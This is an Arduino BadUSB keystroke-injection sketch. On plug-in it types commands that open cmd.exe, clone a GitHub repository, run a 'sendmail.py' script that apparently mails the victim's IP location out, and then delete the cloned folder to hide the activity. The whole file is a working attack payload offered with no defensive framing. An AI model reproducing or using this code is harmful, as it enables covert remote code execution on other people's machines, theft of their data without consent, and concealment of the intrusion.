#include <Keyboard.h>

void pressEnter() {
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(150);
}

void pressWinR() {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
}

void setup() {
  Keyboard.begin();
  delay(4000);

  pressWinR();

  Keyboard.print("cmd.exe");
  pressEnter();

  delay(1500);

  Keyboard.print("cd ..");
  pressEnter();
  delay(500);

  Keyboard.print("cd Public");
  pressEnter();
  delay(500);

  Keyboard.print("git clone https://github.com/karolsznajder/PSZMAJ-BADUSB-IP_location.git");
  pressEnter();

  delay(7000);

  Keyboard.print("cd BADUSB-IP_location");
  pressEnter();

  delay(700);

  Keyboard.print("python sendmail.py");
  pressEnter();

  delay(8000);

  Keyboard.print("cd ..");
  pressEnter();
  delay(500);

  Keyboard.print("rmdir /s /q BADUSB-IP_location");
  pressEnter();
  delay(1000);

  Keyboard.print("exit");
  pressEnter();

  Keyboard.end();
}

void loop() {
}
